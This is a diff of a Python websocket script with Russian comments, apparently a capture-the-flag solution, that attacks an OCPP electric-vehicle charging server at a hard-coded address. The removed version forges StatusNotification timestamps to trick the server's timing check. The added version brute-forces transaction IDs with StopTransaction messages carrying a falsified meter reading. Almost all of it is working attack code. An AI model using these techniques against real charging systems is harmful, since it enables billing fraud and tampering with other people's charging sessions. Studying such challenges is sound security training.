@@ -174,53 +174,42 @@ if __name__ == "__main__":
 import asyncio
 import websockets
 import json
-from datetime import datetime, timedelta, timezone
+from datetime import datetime, timezone
 
-async def exploit():
+async def fuzz_transactions():
     uri = "ws://154.57.164.82:30129/Monastiraki"
     
-    # Генерируем идеальные тайминги с разницей ровно в 60 секунд
-    now = datetime.now(timezone.utc)
-    t1 = now.strftime("%Y-%m-%dT%H:%M:%S.000Z")
-    t2 = (now + timedelta(seconds=60)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
+    async with websockets.connect(uri) as ws:
+        # 1. Авторизуем станцию
+        boot = [2, "boot", "BootNotification", {"chargePointVendor": "VoltGrid", "chargePointModel": "V1"}]
+        await ws.send(json.dumps(boot))
+        await ws.recv() # Пропускаем ответ Accepted
 
-    print("1 Подключаемся к сокету...")
-    async with websockets.connect(uri) as websocket:
+        print("[*] Начинаем перебор transactionId...")
         
-        boot_msg = [2, "msg-1", "BootNotification", {"chargePointVendor": "VoltGrid", "chargePointModel": "V1"}]
-        await websocket.send(json.dumps(boot_msg))
-        print(f"<- {await websocket.recv()}")
-
-        print(f"2 Отправляем SuspendedEVSE со временем {t1}...")
-        suspend_msg = [2, "msg-2", "StatusNotification", {
-            "connectorId": 1, 
-            "errorCode": "NoError", 
-            "status": "SuspendedEVSE",
-            "timestamp": t1
-        }]
-        await websocket.send(json.dumps(suspend_msg))
-        print(f"<- {await websocket.recv()}")
-
-        # Нам больше не нужно ждать реальную минуту, сервер поверит нашим меткам
-        print("3 Делаем небольшую паузу для порядка...")
-        await asyncio.sleep(2)
-
-        print(f"4 Возвращаем Charging со временем {t2} (ровно +60 сек)...")
-        charge_msg = [2, "msg-3", "StatusNotification", {
-            "connectorId": 1, 
-            "errorCode": "NoError", 
-            "status": "Charging",
-            "timestamp": t2
-        }]
-        await websocket.send(json.dumps(charge_msg))
-        
-        print("5 Ожидаем ответ от сервера (и флаг!)...")
-        while True:
-            try:
-                response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
-                print(f"<- {response}")
-            except asyncio.TimeoutError:
-                break
+        # Перебираем ID от 1 до 20 (обычно на CTF они небольшие)
+        for i in range(1, 21):
+            now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
+            
+            stop_msg = [2, f"stop-{i}", "StopTransaction", {
+                "transactionId": i,
+                "meterStop": 9999,
+                "timestamp": now
+            }]
+            
+            await ws.send(json.dumps(stop_msg))
+            response = await ws.recv()
+            
+            # Парсим ответ
+            resp_data = json.loads(response)
+            
+            # В OCPP ответ на невалидную транзакцию часто возвращает ошибку 
+            # или Invalid. Если ответ отличается - мы нашли цель!
+            if "Invalid" not in response and "NotSupported" not in response:
+                print(f"[+] БИНГО! Возможная активная транзакция найдена: ID {i}")
+                print(f"Ответ сервера: {resp_data}")
+            else:
+                print(f"[-] ID {i} мимо...")
 
 if __name__ == "__main__":
-    asyncio.run(exploit())
+    asyncio.run(fuzz_transactions())
